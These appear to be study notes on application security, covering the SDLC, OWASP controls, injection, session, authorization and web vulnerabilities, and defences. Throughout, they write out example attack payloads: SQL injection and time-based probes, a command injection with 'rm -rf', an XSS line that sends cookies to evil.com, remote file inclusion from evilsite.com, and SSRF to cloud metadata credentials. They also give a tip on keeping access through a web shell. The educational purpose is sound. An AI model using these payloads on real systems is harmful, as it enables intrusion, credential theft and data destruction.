---
title: "Application Security"
---
# Application Security

## Software Assurance Best Practices

### The Software Development Lifecycle
* Planning > Requirements > Design > Coding > Testing > Training & Transition > Ongoing Ops/maintenance > End Of Life (Decommission)
* dev env > for devs
* test env > QA/Preprod
* staging > tested but awaiting deployment
* prod
### DevSecOps and DevOps
* Sec becomes a shared responsibility, just like the Ops.

## Designing and Coding For Security

### Secure Coding Practices
* Open Worldwide Application Security Project (OWASP) - best resource for secure coding practices.
* Top Proactive Security Controls by OWASP
  * Define Security Requirements
  * Leverage Security Frameworks
  * Secure Database Access
  * Encode an Escape Data
  * Validate all inputs
  * Implement DIgital Identity
  * Enforce Access Controls
  * Priotect Data Everywhere
  * Implement Security Logging and Monitoring
  * Handle all errors and exceptions
* [OWASP Proactive Controls](https://top10proactive.owasp.org/)
* [OWASP Quick Reference](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
### API Security
* [OWASP API Security](https://owasp.org/www-project-api-security/)

## Software Security Testing

* [State Of Software Security Report](https://www.veracode.com/resources/analyst-reports/state-of-software-security-2025/)
### Analyzing and Testing Code
* Static Code Analysis - reads the actual code to find flaws in it
* Dynamic Code Analysis - runs the code to find flaws in it
* Fuzzing - send random data to application to see how it handles unexpected data

## Injection Vulnerabilitiies

### SQL Injection Attacks
* Is also a class under Code Injection attacks.
* Happens when User Input is directly used in a SQL Query
  * Query Used `SELECT * FROM Products WHERE Name LIKE '%user_input_value%'`
  * User Input `cola'; SELECT * FROM users; --` instead of just `cola`
  * Results in : `SELECT * FROM Products WHERE Name LIKE 'cola'; SELECT * FROM users; --`, so 2 SQL queries
  * However, the results might not be returned/visible to the user, solution? *Blind SQL Injection*
  ### 2 Blind SQL Injection Types
    * *Blind Content-Based SQL Injection*
      * First: Validate if SQL Injection is possible
      * Asume we expect an UserID as User input, and let's assume `123` is a vailid UserID.
      * Query Used `SELECT * FROM Users WHERE Id = '%user_input_value%'`
      * Specify `123' OR 1=1` which results in `SELECT * FROM Users WHERE Id = '123' OR 1=1`
      * This returns multiple rows, did it break anything on the front end? No ? Good ✅
        * You might not see the multiple rows due to business logic,but it DID EXECUTE properly (you get feedback that the query was valid)
      * Now specify `123' OR 1=2` which results in `SELECT * FROM Users WHERE Id = '123' OR 1=2`
      * This returns no row, did it break anything on the front end aside of just saying that there were no results? Yes ? Good ✅
      * We can now asume that SQL injection is possible.
      * *Now you can inject other querys that ALTER data. The baseline feedback if it was succesful or not your query is established in previous steps. Based on the _CONTENT_ you were able to validate if your queries are working*
    * *Blind Time-Based SQL Injection* - (example in Microsoft SQL)
      * First: Validate if SQL Injection is possible
      * Asume we expect an UserID as User input, and let's assume `123` is a vailid UserID.
      * Specify `123'; WAITFOR DELAY '00:00:15'` which results in `SELECT * FROM Users WHERE Id = '123'; WAITFOR DELAY '00:00:15'`
      * If the query now takes 15 seconds to execute, we can be quite confident that the SQL injection is possible. ✅.
      * ⚠️ Now this "timer" trick, can be also used to signal back if something was 'true' (if true, wait 15 seconds, else not).
        * An example, assuming the password is cleartext
        ```
          For each character in the password
            For each letter in the alphabet
              if the current character is equal to the current letter, wait 15 seconds before returning results
        ```
### Code Injection Attacks
* Examples
  * LDAP Injection Attack - Embed commands in text as part of a LDAP query
  * XML Injection Attack - Embed code in XML text
  * DLL Injection Attack - Force an application to load a (malicious) DLL that was not a part of the process.
  * Cross-Site-Scripting (XSS)
### Command Injection Attacks
* When an application executes a command against the OS, there is a potential for exploitation.
* Example
  * You have a webpage to create a user and the end user must specify a username in a form
  * On creation, the app might run a command to create a folder for that new user `system('mkdir /home/students/<mynewusername>`)
  * What if the user specifies `mynewusername && rm -rf home`
  * Now we have piped again additional commands
  * ⚠️ Note that there is again no feedback/response, but you could try to have a script use a time or a `curl` command to post back the output to a webserver you own.

## Exploiting Authentication Vulnerabilities

### Password Authentication
* Flaw: Once an attacher knows a password, they can keep using it for access.
* Risk: Social Engineering, unencrypted traffic, password dumps from hacked sites, brute force, guessing
### Session Attacks
* *Cookie Stealing & Manipulation*
  * Steal an existing (authentication) session
  * After auth, the session token is stored in browser cookie for further request auth
  * How to steal it?
    * Unencrypted network traffic
    * Malware in browser
    * On Path attack - Impersonate target site, forward the actual credentials to target site, return the request to the user with the cookie, but now you also have that cookie. (But you know then the credentials either way?)
  * Once you have the cookie
    * Session Replay Attack - The attacker reuses the session of the target
  * Defenses
    * Mark Cookie `SECURE` - tells the browser to never send it over unencrypted requests
  * NTLM pass-the-hash
    * NTLM hash is the hash function in windows to store user's passwords.
    * So if you can intercept this hash, instead of the username/password, you can also authenticate in/with windows.
* *Unvalidated Redirects*
  * Example: `example.com/order?redirect_ok=https://evilsite.com` and then the evil site can impersonate and ask to re authenticate again or whaterver
  * Example: `example.com/login?login_ok=https://evilsite.com`, then after login it might call `https://evilsite.com?csrf_token=<somevalue>` or the `Referer: https://bank.com/transfer?sessionid=abc123&csrf_token=xyz789` header

## Exploiting Authorization Vulnerabilities

### Insecure Direct Object References
* `example.com/orders?id=100` shows your order and you can just do `example.com/orders?id=101` and see anothers order.
### Directory Traversal
* The web server allows to navigate the directory and list all files - bad configuration
  * Appache Server / NGINX - `www.example.com/../../../etc/shawdow` (so you just path yourself outside the web folder)
  * Open AWS S3 bucket
  * It helps to know on what server the site is host to then learn about their (Default) config
### File Inclusion
* Next level Directory Traversel - you don't just read a file, you execute it
* Run a file from the server's file system: `www.example.com/?include=../../../etc/attack.sh`
* Run a file from an external place: `www.example.com/?include=www.evilsite.com/script.sh`
* Attack might then upload a [Web Shell](https://en.wikipedia.org/wiki/Web_shell) to comfortably run commands and see output
  * ✅ The webshell uses HTTPS, so it hides even better.
* TIP: Patch the vulnerability and persist your access with the web shell
### Privilege Escalation
* Upgrade your user to have more rights or higher group
* [Dirty Cow](https://en.wikipedia.org/wiki/Dirty_COW) - Linux vulnerability

## Exploiting Web Application Vulnerabilities

### Cross-Site Scripting XSS - when an attacker does HTML injection (inject their own HTML into a webpage)
### Reflected XSS
  * When an application allows *"reflected input"*
  * Anywhere, where a user can provide "input" that later would be viewed by another user there is a XSS oppertunity.
  * Example `https://news.com/search.php?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>` assuming that the search page would (without validation) render the search query `q` in the html (`Search results for q`.)
### Stored/Persistent XSS
  * Here the XSS script is stored server/side
  * Example: I leave a product review with content `Good product! <script>alert('oi')</script>`
    * If this input is not sanatized or cleaned, it will store this string in the database.
    * When someone else views the product, and all comments are rendered underneath, the `<script>alert('oi')</script>` part will be seen as actual HTML and the script tag will execute.
    * Now you can replace `alert('oi')` with javascript that will log your keys, steal your cookies, etc... cause you are now runng a script under the domain of the trusted site.
  * ⚠️ Think of other ways where you can "inject HTML" on the request route or from a browser plugin.
  * Solutions
    * Input validation and escaping
    * [OWASP Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
### Request Forgery
* Exploit trust relationships and try users to unwittingly execute commands against a remote server, there are 2 types.
### Cross-Site Request Forgery CSRF/XSRF
  * Assume you are logged in to `mybank.com`.
  * You then visit a dangerous site or link `evil.com`
  * When you click on a button on `evil.com` it might trigger a request to `mybank.com`
  * If you are stil loggedin to `mybank.com`, the request could succeed because the browser would use any cookies linked to the `mybank.com` site.
  * Example HTMl on the `evil.com` site
  ```html
      <!-- Hidden on evilsite.com -->
      <form action="https://somebank.com/transfer" method="POST" id="malicious-form">
          <input type="hidden" name="to_account" value="999999">
          <input type="hidden" name="amount" value="5000">
          <!-- Note: no CSRF token! -->
      </form>

      <script>
          // Automatically submit when page loads
          // document.getElementById('malicious-form').submit();
      </script>
  ```
  * Defenses: secure tokens, check in reffering url to only accept urls that originate from own domain.
### Server-Side Request Forgery SSRF
  * Here we want the server/back-end to make an web call to a url.
  * Let's say you have a web application that takes an URL as input
  * That URL would be used to fetch remote information, and it would return that in some form.
  * Imagine for that URL, you specifcy a URL or IP address that would be not publicly available, but only to your back-end server
  * Example: `GET /preview?url=http://localhost:8080/admin/users`
  * Example: `GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` on AWS exposes IAM credentials
  * Example: `GET /preview?url=file:///etc/passwd`

## Application Security Controls

### Input Validation
* Protects agains Injection attackes, XSS, XSRF, SSRF and many more.
* Best method: Allow Listing
  * When you expect an age, only allow values between 0 - 125, anything else get rejected.
  * Remember, always test at least server side.
* Next best method: Deny Listing (Cause often describing only what is allow is to wide)
  * Look and block for SQL code, HTML tags, etc..
* Parameter Pollution - a trick attackers try to get around input validation/filtering
  * Example `www.example.com/status?account=1&account=1' or 1=1;--`
    * Here the hope is that validiation only happens on the first specification of the parameter, but not the second.
    * This behaviour is very tech specific (PHP, ExpressJS, ASP, Python Flask,....) so the hack really depends on the web server stack.
    * Example : Authentication Bypass - it might take the right passwor for user `guest` but think it was user `admin`
    ```
    POST /login
    user=admin&pass=wrong&user=guest&pass=correct
    ```
    * Example : Rate Limiting bypass
    ```
    GET /api/data?user_id=victim&user_id=attacker
    ```
### Web Application Firewalls (WAFS)
* A WAF sits in front of the actual web server and acts like a firewall but on application level. It can inspect requests and intercept/filter anything suspicious, which would be another layer of security, hopefully blocking this that the eventual backend is not handling.
* Note that the client has a TLS connection to the WAF, so the WAF can inspect all traffic, but then forwads the request as a new TLS connection to the origins server.
### Parameterized Queries
* Input is not put directly into the SQL string, but parameterized, this way the entire input data is pure data, not a part of the SQL text. So it's uses as a literal string. Unescapable (is the theory)
### Sandboxing
* Run app in a controlled or isolated environment, preventing interaction with surroundings.
### Code Security
* Securing the code itself
* *Code Signing* - Sign code by devs to confirm authencity (PGP signature for example)
* *Code Reuse* - Monitor and mainting even higher standards for reused code (e.g. SDKs)
* *Software Diversity* - Watch for single points of failuree
* *Code Repositories* - versioning and history is great for audit
* *Integrity Measurement* - Make sure that approved code its hash matches to the hash being deployed
* *Application Resilience* - through 2 ways
  * Scalability - designed so extra resources can be added
  * Elasticty - a step further, it provisions extra resources when it needs it

## Secure Coding Practices

### Source Handling Comments
Remove code comments in production code (for the non compiled code, like JS)
### Error Handling
Be cautious that error messages dont give to much detail, no debug mode in prod!
### Hard-Coded Credentials
* Well intentioned backdoor - Once the credentials are known, any deployed version is at risk
* Non intentioned - API keys etc..
### Package Monitoring
Monitor your dependencies and packages,
### Memory Management
* *Resource Exhaustion* - Can make the application crash (e.g. memory leak)
* *Pointer Deference* - Memory Pointers, when a pointer points to a memory spot with unkown value it can crash or worst case bypass validation
* *Buffer Overflows* - Attack tricks the app to handle more data then it has assigned.
  * Memory Injection: Goal is to overwrite memory with instructions that might be executed by another process running on the system
### Race Conditions
* When Security of the code depends upon a sequence of events within the system
  * *Time-Of-Check (TOC)* - When a system verifies access permissions or other security controls.
  * *Time-Of-Use (TOU)* - When the system access the resources or permission that was granted.
  * *Target of Evaluation (TOE)* - refers to component/system being evaluated or tested for potential vulnerabilities.
  * *TIme-Of-Check-To-Time-Of-Use* issue is a race condition when the app checks the permission too far ahead of a resource request.
  * Example: If an attacker logs in and has `admin` rights via a web interface, leaves that session open for a day, but within a hour his `admin` rights are taken away, this change might not be observed yet everywhere, cause a session is open and permissions were already evaluated.
### Unprotected APIs
* APIs should be authenticated and make sure that at every endpoint AutH and AuthZ is happening.

## Automation and Orchestration

SOAR: Security Orchestration, Automation, and response platforms.

Automation can remove human error and make security easier and more scaleable.

### Use Cases of Autmation and Scripting
* Examples: User provisioning, resource provisioning, guard rails, security groups, ticket creation, escalation, enabled/disabling services and access, CI & testing, Integrations and APIs
  * Guard Rails: Enforce policy controls and prevent violations of security protocols
### Benefits of Automation and Scripting
* Less chance for human error
* Consistency in how things are done
* Standerization
* Scale in secure manner
* Speed up
### Other Considerations
  * Complexity, Cost, Single point of failure, Technical Debt, Ongoing supportability
